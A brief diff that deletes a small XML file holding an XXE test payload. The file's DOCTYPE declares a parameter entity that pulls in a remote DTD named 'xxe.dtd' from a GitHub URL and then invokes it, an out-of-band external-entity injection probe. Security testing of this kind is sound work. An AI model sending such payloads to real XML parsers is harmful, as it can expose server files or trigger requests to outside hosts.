@@ -1,6 +1,0 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE root [
-    <!ENTITY % remote SYSTEM "https://raw.githubusercontent.com/kaisham/test/refs/heads/master/xxe.dtd">
-    %remote;
-]>
-<root>test</root>
